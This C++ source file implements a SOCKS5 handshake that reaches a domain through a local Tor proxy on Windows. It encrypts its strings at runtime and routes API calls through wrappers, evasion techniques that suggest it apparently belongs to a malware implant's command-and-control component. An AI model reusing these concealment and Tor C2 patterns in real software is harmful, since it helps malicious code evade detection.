#include "global_config.h"
#include <stdio.h>

#define WIN32_LEAN_AND_MEAN
#pragma comment(lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#define MSG_NOSIGNAL 0

#include "connection_tor.h"
#include "crypto.h"
#include <stdlib.h>

#include "common_utils.h"

#include "connection.h"

#include "functions_table.h"

#include "debug.h"

bool connection_tor::init_tor_socket(char *domain, SOCKET *param_socket)
{
    DBG_MSG("connection_tor::init_tor_socket() - domain: %s \n", domain);
    DBG_MSG("connection_tor::init_tor_socket() - Connecting ...\n");

    SOCKADDR_IN SocketAddr;

    bool ret_init_socket = init_socket(param_socket);

    if (!ret_init_socket) {
        DBG_MSG("connection_tor::init_tor_socket() failed - init_socket() failed. Return now. \n");
        return false;
    }

    SocketAddr.sin_family = AF_INET;
    SocketAddr.sin_port = l_htons(9050);

    char* decrypted_str_1 = NULL;

    decrypt_to_string(&decrypted_str_1, LOCALHOST_IP_STR, LOCALHOST_IP_STR_LEN);

    DBG_MSG("decrypted_str_1: %s \n", decrypted_str_1);


    l_inet_pton(AF_INET, decrypted_str_1, &SocketAddr.sin_addr);

    free(decrypted_str_1);

    //l_inet_pton(AF_INET, "127.0.0.1", &SocketAddr.sin_addr);

    int ret_connect = l_connect(*param_socket, (SOCKADDR*)&SocketAddr, sizeof(SOCKADDR_IN));

    if (ret_connect != 0) {
        DBG_MSG("connection_tor::init_tor_socket() - ll_connect() failed, code: %d \n", l_WSAGetLastError());

        return false;
    }

    char Req1[3] =
    {
        0x05, // SOCKS 5
        0x01, // One Authentication Method
        0x00  // No AUthentication
    };

    int ret_send_all = send_all(*param_socket, Req1, 3, MSG_NOSIGNAL);

    if (ret_send_all == -1) {
        DBG_MSG("connection_tor::init_tor_socket() - send_all() failed, error code: %d. Return now.\n", l_GetLastError());
        return false;
    }

    //
    char* recv_by_length_exactly_ptr = NULL;
    char Resp1[2];

    
    recv_by_length_exactly_ptr = recv_by_length_exactly(*param_socket, 2);
    
    if (recv_by_length_exactly_ptr==NULL) {
        DBG_MSG("connection_tor::init_tor_socket() - recv_by_length_exactly() failed. Return now.\n");
        return false;
    }

    memcpy(Resp1, recv_by_length_exactly_ptr, 2);
    free(recv_by_length_exactly_ptr);

    //
    if (Resp1[1] != 0x00)
    {
        DBG_MSG("connection_tor::init_tor_socket() - Resp1 Error Authenticating " "\n");
        return(false); // Error
    }

    DBG_MSG("connection_tor::init_tor_socket() - Fetching...\n");

    char  DomainLen = (char)strlen(domain);
    short Port = l_htons(80);

    char TmpReq[4] = {
          0x05, // SOCKS5
          0x01, // CONNECT
          0x00, // RESERVED
          0x03, // DOMAIN
    };

    char* Req2 = (char*)calloc(4 + 1 + DomainLen + 2, 1);

    memcpy(Req2, TmpReq, 4);                // 5, 1, 0, 3
    memcpy(Req2 + 4, &DomainLen, 1);        // domain Length
    memcpy(Req2 + 5, domain, DomainLen);    // domain
    memcpy(Req2 + 5 + DomainLen, &Port, 2); // Port

    ret_send_all = send_all(*param_socket, (char*)Req2, 4 + 1 + DomainLen + 2, MSG_NOSIGNAL);

    if (ret_send_all == -1) {
        DBG_MSG("connection_tor::init_tor_socket() - send_all() failed, error code: %d. Return now.\n", l_GetLastError());
        return false;
    }

    free(Req2);

    char Resp2[10];

    recv_by_length_exactly_ptr = recv_by_length_exactly(*param_socket, 10);

    if (recv_by_length_exactly_ptr == NULL) {
        DBG_MSG("connection_tor::init_tor_socket() - recv_by_length_exactly() failed. Return now.\n");
        return false;
    }

    memcpy(Resp2, recv_by_length_exactly_ptr, 10);
    free(recv_by_length_exactly_ptr);
    //
    
    if (Resp2[1] != 0x00)
    {
        DBG_MSG("connection_tor::init_tor_socket() - Resp2 Error : %d \n", Resp2[1]);
        return(false); // ERROR
    }

    DBG_MSG("connection_tor::init_tor_socket() - Connected \n");
    DBG_MSG("connection_tor::init_tor_socket() - SUCCESS. \n");

    //
    return(true);
}


